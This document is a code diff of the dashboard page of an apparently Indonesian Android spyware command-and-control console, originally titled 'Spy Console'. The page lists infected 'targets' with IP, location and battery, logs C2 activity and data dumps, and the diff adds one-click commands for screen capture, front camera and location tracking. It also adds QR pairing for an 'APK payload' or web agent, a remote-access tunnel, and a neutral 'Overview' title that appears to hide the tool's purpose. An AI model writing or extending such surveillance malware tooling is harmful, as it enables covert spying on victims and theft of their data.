@@ -3,94 +3,155 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Dashboard — M4zk1pLaySpy</title>
+<title>Overview</title>
 <link rel="stylesheet" href="/static/css/style.css">
 </head>
 <body>
-<div class="shell">
-  <aside class="side">
-    <div class="brand">
-      <img src="/static/img/garuda.svg" alt="">
-      <div><b>M4ZK1PL4Y</b><span>SPY CONSOLE</span></div>
-    </div>
-    <nav class="nav">
-      <a href="/dashboard">▣ <span class="lbl">DASHBOARD</span></a>
-      <a href="/targets">◈ <span class="lbl">TARGET</span><i class="dot" id="navDot">0</i></a>
-      <a href="/build">⚙ <span class="lbl">BUILD APK</span></a>
-      <a href="/dumps">⇩ <span class="lbl">HASIL DUMP</span></a>
-      <a href="/admin">☰ <span class="lbl">ADMIN</span></a>
-    </nav>
-    <div class="side-foot">
-      <div id="clock">--:--:--</div>
-      <div style="margin-top:6px">v1.4.0 · <span id="rtLed" class="led"></span> realtime</div>
-      <a href="#" id="logout" style="display:block;margin-top:10px;color:var(--red)">▸ KELUAR</a>
-    </div>
-  </aside>
-
-  <main class="main">
-    <header class="top">
-      <h2 class="glitch" data-t="DASHBOARD">DASHBOARD</h2>
-      <span class="pill on"><i class="led on"></i><span id="onCount">0</span> ONLINE</span>
-      <span class="pill off"><span id="offCount">0</span> OFFLINE</span>
-      <div class="spacer"></div>
-      <span class="pill"><span id="dumpCount">0</span> DUMP</span>
-      <a class="btn sm" href="/build">+ BUILD</a>
-    </header>
-
-    <div class="content">
-      <div class="grid g4">
-        <div class="card stat red"><div class="k">TARGET ONLINE</div><div class="v" id="s1">0</div><div class="bar"><i id="b1"></i></div></div>
-        <div class="card stat"><div class="k">TOTAL TARGET</div><div class="v" id="s2">0</div><div class="bar"><i id="b2"></i></div></div>
-        <div class="card stat amber"><div class="k">HASIL DUMP</div><div class="v" id="s3">0</div><div class="bar"><i id="b3"></i></div></div>
-        <div class="card stat green"><div class="k">APK DIBANGUN</div><div class="v" id="s4">0</div><div class="bar"><i id="b4"></i></div></div>
-      </div>
-
-      <div class="grid g2">
-        <div class="card">
-          <div class="card-h"><b>TARGET REALTIME</b><div class="spacer"></div><span class="tag on">LIVE</span></div>
-          <div class="card-b"><div class="t-list" id="live"></div></div>
-        </div>
-        <div class="card">
-          <div class="card-h"><b>AKTIVITAS C2</b><div class="spacer"></div><span class="tag">LOG</span></div>
-          <div class="card-b"><div class="console" id="log"></div></div>
-        </div>
-      </div>
-
-      <div class="card">
-        <div class="card-h"><b>RINGKASAN PERANGKAT</b></div>
-        <div class="card-b" style="padding:0">
-          <table>
-            <thead><tr><th>Perangkat</th><th>Android</th><th>IP</th><th>Baterai</th><th>Status</th><th>Terakhir</th></tr></thead>
-            <tbody id="rows"><tr><td colspan="6" class="empty">memuat…</td></tr></tbody>
-          </table>
-        </div>
-      </div>
-    </div>
-  </main>
-</div>
+<div class="win" id="win"></div>
 <div class="toast-wrap" id="tw"></div>
-
+<div class="mask" id="mask"><div class="dlg" id="dlg"></div></div>
 <script type="module">
-import { $, api, post, toast, esc, fmt, clock, markNav } from '/static/js/core.js';
+import { $, api, post, toast, esc, fmt, jitter } from '/static/js/core.js';
+import { chrome, statusbar, svg, about } from '/static/js/ui.js';
 import { connect, on, statusLed } from '/static/js/ws.js';
 
-markNav();
-clock($('#clock'));
-statusLed($('#rtLed'));
+const win = $('#win');
+chrome(win, {
+  page: 'dashboard', title: 'Overview',
+  actions: [
+    '<button class="tbtn" data-cmd="ping">' + svg('ping') + 'PING</button>',
+    '<button class="tbtn" data-cmd="screen_start">' + svg('screen') + 'SCREEN</button>',
+    '<button class="tbtn" data-cmd="cam_front">' + svg('cam') + 'CAM</button>',
+    '<button class="tbtn" data-cmd="locate_start">' + svg('loc') + 'LOKASI</button>',
+    '<div class="tb-sep"></div>',
+    '<button class="tbtn" id="btnQr">' + svg('qr') + 'PAIR QR</button>',
+    '<button class="tbtn" id="btnTun">' + svg('tunnel') + 'TUNNEL</button>',
+    '<button class="tbtn" id="btnBuild">' + svg('build') + 'BUILD</button>',
+  ],
+});
+const body = document.createElement('div');
+body.className = 'body pad';
+win.appendChild(body);
+statusbar(win, '<span class="st"><b>&#9679;</b> CONSOLE</span>' +
+  '<span class="st" id="stTun">tunnel: mati</span><span class="st-r">v2.1.0</span>');
+statusLed($('#tbOn'));
 
-$('#logout').onclick = async (e) => {
-  e.preventDefault();
-  await post('/api/logout');
-  location.href = '/';
-};
+body.innerHTML = `
+<div class="grid g4">
+  <div class="card stat acc"><div class="k">ONLINE</div><div class="v" id="s1">0</div>
+    <div class="bar"><i id="b1"></i></div></div>
+  <div class="card stat"><div class="k">TOTAL CLIENT</div><div class="v" id="s2">0</div>
+    <div class="bar ok"><i id="b2"></i></div></div>
+  <div class="card stat warn"><div class="k">DUMP</div><div class="v" id="s3">0</div>
+    <div class="bar warn"><i id="b3"></i></div></div>
+  <div class="card stat cyan"><div class="k">BUILD</div><div class="v" id="s4">0</div>
+    <div class="bar"><i id="b4"></i></div></div>
+</div>
+<div class="grid g2">
+  <div class="card"><div class="card-h">${svg('clients')}CLIENT ONLINE<span class="spacer"></span>
+    <span class="tag on">LIVE</span></div>
+    <div style="padding:0"><div id="live" class="cl-scroll" style="max-height:210px"></div></div></div>
+  <div class="card"><div class="card-h">${svg('term')}AKTIVITAS C2<span class="spacer"></span>
+    <span class="tag">LOG</span></div>
+    <div class="card-b"><div class="console" id="log"></div></div></div>
+</div>
+<div class="grid g2">
+  <div class="card"><div class="card-h">${svg('qr')}PAIRING INSTAN</div>
+    <div class="card-b">
+      <div class="pairgrid">
+        <div class="pcard on" data-mode="web"><b>WEB AGENT</b><span>scan &rarr; kendali browser, tanpa install</span></div>
+        <div class="pcard" data-mode="apk"><b>APK PAYLOAD</b><span>scan &rarr; unduh &amp; pasang agent</span></div>
+      </div>
+      <div class="row" style="margin-top:9px">
+        <button class="btn acc sm" id="genQr">BUAT QR</button>
+        <a class="btn ghost sm" href="/pair">HALAMAN PAIRING</a>
+      </div>
+    </div></div>
+  <div class="card"><div class="card-h">${svg('tunnel')}AKSES JARAK JAUH</div>
+    <div class="card-b">
+      <div class="kv">
+        <div class="k">Status</div><div class="v" id="tunSt">mati</div>
+        <div class="k">URL</div><div class="v" id="tunUrl">&mdash;</div>
+        <div class="k">Engine</div><div class="v" id="tunKind">&mdash;</div>
+      </div>
+      <div class="row" style="margin-top:9px">
+        <button class="btn acc sm" id="tunStart">NYALAKAN</button>
+        <button class="btn ghost sm" id="tunStop">MATIKAN</button>
+        <button class="btn ghost sm" id="tunCopy">SALIN</button>
+      </div>
+      <div class="console" id="tunLog" style="height:70px;margin-top:7px"></div>
+    </div></div>
+</div>
+<div class="card"><div class="card-h">${svg('file')}RINGKASAN PERANGKAT</div>
+  <div style="overflow:auto"><table class="tbl">
+    <thead><tr><th>Client</th><th>Sumber</th><th>Android</th><th>IP</th><th>BAT</th>
+      <th>Status</th><th>Terakhir</th></tr></thead>
+    <tbody id="rows"></tbody></table></div></div>`;
 
-function log(msg, cls = '') {
+const log = (msg, cls = '') => {
   const el = document.createElement('div');
-  el.innerHTML = `<span class="tm">${fmt.time(Date.now() / 1000)}</span> <span class="${cls}">${esc(msg)}</span>`;
+  el.innerHTML = '<span class="tm">' + fmt.time(Date.now() / 1000) + '</span> <span class="' +
+    cls + '">' + esc(msg) + '</span>';
   const box = $('#log');
   box.prepend(el);
-  while (box.children.length > 160) box.lastChild.remove();
+  while (box.children.length > 150) box.lastChild.remove();
+};
+
+let qrMode = 'web';
+document.querySelectorAll('.pcard').forEach((c) => {
+  c.addEventListener('click', () => {
+    document.querySelectorAll('.pcard').forEach((x) => x.classList.remove('on'));
+    c.classList.add('on');
+    qrMode = c.dataset.mode;
+  });
+});
+
+async function showQr() {
+  try {
+    const r = await post('/api/pair/new', { mode: qrMode, ttl: 900 });
+    $('#dlg').innerHTML =
+      '<div class="dlg-h">' + svg('qr') + 'PAIRING ' + qrMode.toUpperCase() +
+      '<span class="x">&times;</span></div><div class="dlg-b" style="text-align:center">' +
+      '<div class="qr-box"><img src="' + r.qr + '" alt="QR"></div>' +
+      '<div class="qr-url" style="margin-top:8px">' + esc(r.url) + '</div>' +
+      '<div class="dim" style="font-size:8.5px;margin-top:6px">berlaku ' +
+      Math.round(r.ttl / 60) + ' menit</div></div>' +
+      '<div class="dlg-f"><button class="btn ghost" id="cpQr">SALIN</button>' +
+      '<a class="btn acc" href="' + r.url + '" target="_blank">BUKA</a></div>';
+    $('#mask').classList.add('on');
+    $('#dlg .x').onclick = () => $('#mask').classList.remove('on');
+    $('#mask').onclick = (e) => { if (e.target === $('#mask')) $('#mask').classList.remove('on'); };
+    $('#cpQr').onclick = () => navigator.clipboard.writeText(r.url).then(() => toast('Disalin.', 'ok'));
+    log('pairing ' + qrMode + ' dibuat', 'ok');
+  } catch (e) { toast(e.message, 'wn'); }
 }
+$('#btnQr').onclick = showQr;
+$('#genQr').onclick = showQr;
+$('#btnBuild').onclick = () => { location.href = '/build'; };
+$('#btnTun').onclick = () => { location.href = '/admin#tunnel'; };
+
+async function tunStatus() {
+  try {
+    const s = await api('/api/tunnel/status');
+    $('#tunSt').textContent = s.on ? 'AKTIF' : 'mati';
+    $('#tunSt').style.color = s.on ? 'var(--ok)' : 'var(--acc)';
+    $('#tunUrl').textContent = s.url || '\u2014';
+    $('#tunKind').textContent = s.kind || '\u2014';
+    $('#stTun').textContent = s.url ? 'tunnel: ' + s.url : 'tunnel: mati';
+    $('#tunLog').textContent = (s.log || []).slice(-7).join('\n');
+  } catch {}
+}
+$('#tunStart').onclick = async () => {
+  toast('Menyalakan tunnel...');
+  try { await post('/api/tunnel/start', { kind: 'auto' }); toast('Tunnel aktif.', 'ok'); }
+  catch (e) { toast(e.message, 'wn'); }
+  tunStatus();
+};
+$('#tunStop').onclick = async () => { await post('/api/tunnel/stop'); toast('Tunnel mati.'); tunStatus(); };
+$('#tunCopy').onclick = async () => {
+  const s = await api('/api/tunnel/status');
+  if (s.url) navigator.clipboard.writeText(s.url).then(() => toast('Disalin.', 'ok'));
+};
 
 async function refresh() {
   try {
@@ -98,31 +159,33 @@ async function refresh() {
     const st = d.stats;
     $('#s1').textContent = st.online;
     $('#s2').textContent = st.total;
-    $('#onCount').textContent = st.online;
-    $('#offCount').textContent = Math.max(0, st.total - st.online);
-    $('#navDot').textContent = st.online;
+    $('#tbOn').textContent = st.online;
     $('#b1').style.width = st.total ? (st.online / st.total * 100) + '%' : '0%';
     $('#b2').style.width = st.total ? '100%' : '0%';
 
-    const live = $('#live');
-    const onl = d.targets.filter((t) => t.online).slice(0, 8);
-    live.innerHTML = onl.length ? onl.map((t) => `
-      <a class="t-row" href="/targets?t=${esc(t.id)}">
-        <div class="av">${esc((t.brand || '?')[0]).toUpperCase()}</div>
-        <div><div class="nm">${esc(t.brand)} ${esc(t.model)}</div>
-          <div class="mt">${esc(t.ip || '-')} · Android ${esc(t.android || '?')}</div></div>
-        <span class="led on"></span>
-      </a>`).join('') : '<div class="empty">belum ada target online</div>';
+    const onl = d.targets.filter((t) => t.online).slice(0, 12);
+    $('#live').innerHTML = onl.length
+      ? '<table class="ctable"><tbody>' + onl.map((t) =>
+        '<tr data-id="' + esc(t.id) + '"><td style="width:12px"><i class="led ' +
+        (t.source === 'web' ? 'web' : 'on') + '"></i></td>' +
+        '<td class="c-name">' + esc(t.label || t.model || t.id) +
+        '<small>' + esc(t.ip || '-') + ' &middot; ' + esc(t.city || t.country || '-') + '</small></td>' +
+        '<td style="width:44px"><span class="tag ' + (t.source === 'web' ? 'cy' : '') + '">' +
+        esc((t.source || 'apk').toUpperCase()) + '</span></td></tr>').join('') + '</tbody></table>'
+      : '<div class="empty">belum ada client online</div>';
+    document.querySelectorAll('#live tr').forEach((r) => {
+      r.onclick = () => { location.href = '/targets?t=' + r.dataset.id; };
+    });
 
-    $('#rows').innerHTML = d.targets.slice(0, 20).map((t) => `
-      <tr>
-        <td><a href="/targets?t=${esc(t.id)}">${esc(t.label || t.model || t.id)}</a></td>
-        <td>${esc(t.android || '-')}</td>
-        <td class="mono">${esc(t.ip || '-')}</td>
-        <td>${t.battery || 0}%</td>
-        <td><span class="tag ${t.online ? 'on' : ''}">${t.online ? 'ONLINE' : 'OFFLINE'}</span></td>
-        <td>${fmt.ago(t.last_seen)}</td>
-      </tr>`).join('') || '<tr><td colspan="6" class="empty">belum ada perangkat</td></tr>';
+    $('#rows').innerHTML = d.targets.slice(0, 25).map((t) =>
+      '<tr><td><a href="/targets?t=' + esc(t.id) + '">' + esc(t.label || t.model || t.id) + '</a></td>' +
+      '<td><span class="tag ' + (t.source === 'web' ? 'cy' : '') + '">' +
+      esc((t.source || 'apk').toUpperCase()) + '</span></td>' +
+      '<td>' + esc(t.android || '-') + '</td><td class="mono">' + esc(t.ip || '-') + '</td>' +
+      '<td>' + (t.battery || 0) + '%</td>' +
+      '<td><span class="tag ' + (t.online ? 'on' : '') + '">' + (t.online ? 'ONLINE' : 'OFFLINE') + '</span></td>' +
+      '<td class="dim">' + fmt.ago(t.last_seen) + '</td></tr>').join('')
+      || '<tr><td colspan="7" class="empty">belum ada perangkat</td></tr>';
   } catch (e) { log('gagal muat target: ' + e.message, 'er'); }
 }
 
@@ -131,21 +194,31 @@ async function stats() {
     const s = await api('/api/admin/stats');
     $('#s3').textContent = s.dumps;
     $('#s4').textContent = s.builds;
-    $('#dumpCount').textContent = s.dumps;
     $('#b3').style.width = Math.min(100, s.dumps) + '%';
     $('#b4').style.width = Math.min(100, s.builds * 10) + '%';
   } catch {}
 }
 
-on('presence', (m) => { log(`target ${m.id.slice(0, 8)} ${m.online ? 'ONLINE' : 'OFFLINE'}`, m.online ? 'ok' : 'wn'); refresh(); });
-on('result', (m) => log(`hasil ${m.id} → ${m.ok ? 'OK' : 'GAGAL'}`, m.ok ? 'ok' : 'er'));
-on('dump', (m) => { log(`dump ${m.kind} · ${fmt.bytes(m.size)}`, 'ok'); stats(); });
+on('presence', (m) => {
+  log('target ' + String(m.id).slice(0, 8) + ' ' + (m.online ? 'ONLINE' : 'OFFLINE'),
+    m.online ? 'ok' : 'wn');
+  refresh();
+});
+on('result', (m) => log('hasil ' + m.id + ' \u2192 ' + (m.ok ? 'OK' : 'GAGAL'), m.ok ? 'ok' : 'er'));
+on('dump', (m) => { log('dump ' + m.kind + ' \u00b7 ' + fmt.bytes(m.size), 'ok'); stats(); });
 on('targets_dirty', refresh);
 
-connect();
-refresh(); stats();
-setInterval(refresh, 12000);
-setInterval(stats, 20000);
+window.addEventListener('mzk:cmd', (e) => {
+  const k = e.detail;
+  if (k === 'tunnel') { location.href = '/admin#tunnel'; return; }
+  if (k === 'broadcast') { location.href = '/admin#broadcast'; return; }
+  toast('Pilih client di halaman CLIENTS dulu.', 'wn');
+});
+
+connect(); refresh(); stats(); tunStatus();
+setInterval(refresh, jitter(9000, 3000));
+setInterval(stats, 15000);
+setInterval(tunStatus, 6000);
 log('konsol siap', 'ok');
 </script>
 </body>
